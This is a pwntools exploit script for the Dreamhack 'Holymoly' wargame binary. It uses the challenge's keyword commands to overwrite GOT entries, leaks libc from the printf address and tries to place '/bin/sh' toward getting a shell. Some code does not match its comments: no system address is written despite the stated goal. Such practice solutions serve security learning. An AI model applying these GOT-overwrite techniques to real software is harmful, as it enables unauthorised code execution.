from pwn import *

# context.terminal = ['tmux', 'new-window']

success = lambda name, addr: log.success(f"{name}: {hex(addr)}")

env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Holymoly/problem/libc-2.31.so"}
rem = process("./Pwnable/Holymoly/problem/holymoly", env = env)

# port = 8347
# rem = remote("host8.dreamhack.games", port)

# lib = ELF("./Pwnable/Holymoly/problem/libc-2.31.so")
lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./Pwnable/Holymoly/problem/holymoly")

# goal 1: set put.GOT to main address
# goal 2: set memcmp.GOT to system address and mystery.str to "/bin/sh"

#define HOLYMOLY        "holymoly"
#define ROLYPOLY        "rolypoly"
#define MONOPOLY        "monopoly"
#define GUACAMOLE       "guacamole"
#define ROBOCARPOLI     "robocarpoli"
#define HALLIGALLI      "halligalli"
#define BROCCOLI        "broccoli"
#define BORDERCOLLIE    "bordercollie"
#define BLUEBERRY       "blueberry"
#define CRANBERRY       "cranberry"
#define MYSTERY         "mystery"

# main: 0x4011f6
# Interpret: 0x4012e2
# Parse: 0x401349
# ProcessPhraseID: 0x4013fb
# Increase: 0x4014a7
# Decrease: 0x4014ef
# Read: 0x40153d
# Write: 0x401561
# OperateSwitch: 0x40157d
# phrases: 0x403d00 (mystery.str = 0x40206a)

increase_0x1000 = b"holymoly"
increase_0x100 = b"rolypoly"
increase_0x10 = b"monopoly"
increase_0x1 = b"guacamole"

decrease_0x1000 = b"robocarpoli"
decrease_0x100 = b"halligalli"
decrease_0x10 = b"broccoli"
decrease_0x1 = b"bordercollie"

read_cmd = b"blueberry"
write_cmd = b"cranberry"
switch_cmd = b"mystery"

ptr = 0
val = 0
isPtr = False

def make_cmd(target_num, forPtr):
  cmd = b""
  global isPtr, ptr, val
  if (forPtr and not isPtr) or (not forPtr and isPtr):
    cmd += switch_cmd
    isPtr = not isPtr
  if forPtr:
    diff = target_num - ptr
    ptr = target_num
  else:
    diff = target_num - val
    val = target_num
  val_list = [0x1000, 0x100, 0x10, 0x1]
  if diff >= 0:
    op_list = [increase_0x1000, increase_0x100, increase_0x10, increase_0x1]
  else:
    op_list = [decrease_0x1000, decrease_0x100, decrease_0x10, decrease_0x1]
    diff = -diff
  for i in range(4):
    cmd += op_list[i] * (diff // val_list[i])
    diff %= val_list[i]
  return cmd


printf_got = elf.got['printf']
puts_got = elf.got['puts']
main_addr = 0x4011f6
holymoly_addr = 0x402085

payload = make_cmd(printf_got, forPtr=True)
payload += read_cmd
payload += make_cmd(puts_got, forPtr=True)
payload += make_cmd(main_addr, forPtr=False)
payload += write_cmd

rem.sendlineafter(b"? ", payload)
lib_base = u64(rem.recvn(6).ljust(8, b"\x00")) - lib.symbols['printf']

success("lib base", lib_base)

ptr = 0
val = 0
isPtr = False

holymoly_addr = elf.got['__isoc99_scanf']
bits = u64(b"/b".ljust(8, b"\x00"))
payload = make_cmd(holymoly_addr, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
bits = u64(b"in".ljust(8, b"\x00"))
payload += make_cmd(holymoly_addr + 2, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
bits = u64(b"/s".ljust(8, b"\x00"))
payload += make_cmd(holymoly_addr + 4, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
bits = u64(b"h".ljust(8, b"\x00"))
payload += make_cmd(holymoly_addr + 6, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
print(hex(len(payload)))

# gdb.attach(rem)
rem.sendlineafter(b"? ", payload)

rem.interactive()